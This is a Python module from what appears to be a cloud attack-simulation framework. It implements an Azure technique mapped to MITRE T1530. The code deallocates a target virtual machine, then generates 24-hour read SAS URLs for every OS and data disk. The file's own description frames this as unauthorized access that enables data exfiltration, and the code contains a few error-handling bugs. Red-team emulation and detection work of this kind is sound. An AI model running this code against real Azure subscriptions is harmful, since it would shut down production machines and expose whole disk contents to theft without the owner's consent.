from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.compute import ComputeManagementClient
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureGenerateVMDiskSASUrl(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            ),
            MitreTechnique(
                technique_id="T1552.005", 
                technique_name="Unsecured Credentials",
                tactics=["Credential Access"],
                sub_technique_name="Cloud Instance Metadata API"
            )
        ]
        azure_trm_techniques = [
            AzureTRMTechnique(
                technique_id="AZT701.1",
                technique_name="SAS URI Generation",
                tactics=["Impact"],
                sub_technique_name="VM Disk SAS URI"
            )
        ]
        super().__init__("Generate VM Disk SAS URL", "Generates SAS tokens to gain unauthorized access to Azure VM disk contents. This technique allows an attacker to create time-limited access tokens for both OS and data disks attached to virtual machines, enabling potential data exfiltration. The technique first deallocates the target VM if running, then generates SAS URIs with read permissions valid for 24 hours.", mitre_techniques, azure_trm_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            rg_name: str = kwargs["rg_name"]
            vm_name: str = kwargs["vm_name"]

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # create client
            compute_client = ComputeManagementClient(credential, subscription_id)
            
            # Get the virtual machine
            vm = compute_client.virtual_machines.get(rg_name, vm_name)
            
            # Check the status of the VM
            instance_view = compute_client.virtual_machines.instance_view(rg_name, vm_name)
            vm_status = next((s.code for s in instance_view.statuses if s.code.startswith('PowerState/')), None)
            try:
                if vm_status != 'PowerState/deallocated':
                    print(f"VM {vm_name} is not stopped. Current state: {vm_status}. Stopping the VM...")
                    compute_client.virtual_machines.begin_deallocate(rg_name, vm_name).result()
                    print(f"VM {vm_name} is now stopped.")
                else:
                    print(f"VM {vm_name} is already stopped.")
            except Exception as e:
                return False, {"Error" : "Failed to stop the VM"}, None

            # Extract disks from the VM
            os_disk = None
            data_disks = []
            if vm.storage_profile.os_disk:
                os_disk = vm.storage_profile.os_disk
            if vm.storage_profile.data_disks:
                data_disks.extend(vm.storage_profile.data_disks)

            if not os_disk and not data_disks:
                return False, {"Error": "No disks found in the VM"}, None

            sas_tokens = {"os_disk": {}, "data_disks": {}}
            
            # Process OS data_disk
            if os_disk:
                try:
                    disk_resource = compute_client.disks.get(rg_name, disk_name=os_disk.name)
                    sas_token = compute_client.disks.begin_grant_access(
                        resource_group_name=disk_resource.id.split('/')[4],
                        disk_name=os_disk.name,
                        grant_access_data={
                            'access': 'Read',
                            'duration_in_seconds': 86400
                        }
                    ).result()

                    if sas_token.access_sas:
                        print(f"Successfully got a link for OS data_disk {os_disk.name}. Link is active for 24 hours.")
                        sas_tokens["os_disk"][os_disk.name] = sas_token.access_sas
                except Exception as e:
                    sas_tokens["os_disk"][os_disk.name] = (f"Error generating SAS token for OS data_disk {os_disk.name}: {e}")

            # Process data disks
            for data_disk in data_disks:
                try:
                    disk_resource = compute_client.disks.get(rg_name, disk_name=data_disk.name)
                    sas_token = compute_client.disks.begin_grant_access(
                        resource_group_name=disk_resource.id.split('/')[4],
                        disk_name=data_disk.name,
                        grant_access_data={
                            'access': 'Read',
                            'duration_in_seconds': 86400
                        }
                    ).result()

                    if sas_token.access_sas:
                        print(f"Successfully got a link for data data_disk {data_disk.name}. Link is active for 24 hours.")
                        sas_tokens["data_disks"][data_disk.name] = sas_token.access_sas
                except Exception as e:
                    sas_tokens["os_disk"][data_disk.name] = (f"Error generating SAS token for OS data_disk {data_disk.name}: {e}")

            if sas_tokens["os_disk"] or sas_tokens["data_disks"]:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully generated SAS token for VM",
                    "value": sas_tokens
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to generate SAS token for VM"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to generate SAS token for VM"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "vm_name": {"type": "str", "required": True, "default": None, "name": "VM Name", "input_field_type" : "text"},
            "rg_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"}
        }